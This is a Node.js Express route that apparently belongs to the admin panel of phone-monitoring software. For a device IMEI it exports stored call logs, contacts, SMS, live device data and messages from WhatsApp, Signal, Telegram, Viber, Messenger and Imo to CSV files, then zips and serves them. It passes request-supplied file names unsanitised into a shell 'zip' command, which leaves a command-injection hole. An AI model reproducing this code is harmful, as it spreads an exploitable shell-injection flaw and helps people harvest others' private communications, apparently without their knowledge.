const express = require("express");
const path = require("path");
const ObjectsToCsv = require("objects-to-csv");
const mkdirp = require("mkdirp");
const fs = require("fs");
// const archiver = require("archiver");
const util = require("util");
const exec = util.promisify(require("child_process").exec);

const CallLogs = require("../../../models/CallLogs");
const Conion = require("../../../models/Conion");
const Contacts = require("../../../models/Contacts");
const Imo = require("../../../models/Imo");
const LiveInfos = require("../../../models/LiveInfos");
const Messenger = require("../../../models/Messenger");
const ProtectedText = require("../../../models/ProtectedText");
const Signal = require("../../../models/Signal");
const SmsLogs = require("../../../models/SmsLogs");
const Telegram = require("../../../models/Telegram");
const Viber = require("../../../models/Viber");
const Whatsapp = require("../../../models/Whatsapp");

const router = express.Router();

router.post("/", async (req, res) => {
  try {
    const { imei, files, type = "", static = false } = req.body;
    
    await createLatestStatic(imei)
    console.log("___________________________________________", req.body)
    const directoryPath = path.join(
      path.join(__dirname, `../../../files/${imei}`)
    );
    let stmt = "";
    files.map(v => {
      stmt = stmt + " " + v
    })
    console.log("stmt ----- ", stmt)
    const { stdout, stderr } = await exec(
      "cd " + directoryPath + "/data && zip -g data.zip " + stmt
    );
    console.log("stdout:", stdout);
    console.error("stderr:", stderr);
    console.log("----file ziped----");

    res.set({
      "Content-Type": "application/octet-stream",
      "Content-Disposition": 'attachment; filename="' + imei + '"',
      "filename": imei + ".zip"
    })
    res.setHeader('Access-Control-Expose-Headers', 'filename');
    res.sendFile(directoryPath + "/data/data.zip", {}, function (err) {
      if (err) {
        console.log("error ", err)
      }
      fs.unlink(directoryPath + "/data/data.zip", err => {
        console.log("unable to delete file in zip ", err)
      })
    })
    //res.status(200).json({ message: "Files download ready!" });

  } catch (e) {
    console.log("/api/v0.0.1/admin/downloadsfiles.js (xinj-9)", e.message); //xinj-9
    if(e.message.includes("Command failed")){
      res.status(201).send("file not exist "); //xinj-10
    }
    res.status(500).send("/api/v0.0.1/admin/downloads files.js (xinj-10)"); //xinj-10
  }
});

module.exports = router;


const createLatestStatic = async (imei) => {
  try {

    mkdirp.sync(path.join(__dirname, `../../../files/${imei}/data/`));

    const callLogs = new ObjectsToCsv(await CallLogs.find({ imei }).lean());
    await callLogs.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/callLogs.csv`)
    );

    const conion = new ObjectsToCsv(await Conion.find({ imei }).lean());
    await conion.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/conion.csv`)
    );

    const contacts = new ObjectsToCsv(await Contacts.find({ imei }).lean());
    await contacts.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/contacts.csv`)
    );

    const imo = new ObjectsToCsv(await Imo.find({ imei }).lean());
    await imo.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/imo.csv`)
    );

    const liveInfos = new ObjectsToCsv(await LiveInfos.find({ imei }).lean());
    await liveInfos.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/liveInfos.csv`)
    );

    const messenger = new ObjectsToCsv(await Messenger.find({ imei }).lean());
    await messenger.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/messenger.csv`)
    );

    const protectedText = new ObjectsToCsv(
      await ProtectedText.find({ imei }).lean()
    );
    await protectedText.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/protectedText.csv`)
    );

    const signal = new ObjectsToCsv(await Signal.find({ imei }).lean());
    await signal.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/signal.csv`)
    );

    const smsLogs = new ObjectsToCsv(await SmsLogs.find({ imei }).lean());
    await smsLogs.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/smsLogs.csv`)
    );

    const telegram = new ObjectsToCsv(await Telegram.find({ imei }).lean());
    await telegram.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/telegram.csv`)
    );

    const viber = new ObjectsToCsv(await Viber.find({ imei }).lean());
    await viber.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/viber.csv`)
    );

    const whatsapp = new ObjectsToCsv(await Whatsapp.find({ imei }).lean());
    await whatsapp.toDisk(
      path.join(__dirname, `../../../files/${imei}/data/whatsapp.csv`)
    );

  } catch (err) {
    console.log("error ", err)
  }
}
//cd /home/vpn/files/d4c49cbeec9c8be8/data && zip -g y.zip krjefbjrefg signal.csv smsLogs.csv 4565762764357878 6743575478785478 tyryyr